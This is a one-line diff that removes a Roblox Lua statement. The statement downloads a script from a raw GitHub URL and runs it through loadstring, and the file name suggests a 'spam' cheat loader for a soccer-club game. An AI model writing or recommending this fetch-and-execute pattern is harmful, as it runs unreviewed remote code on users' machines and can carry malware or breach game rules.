@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/build-a-soccer-club-spam2-57qsv8rao7urtw.lua"))()
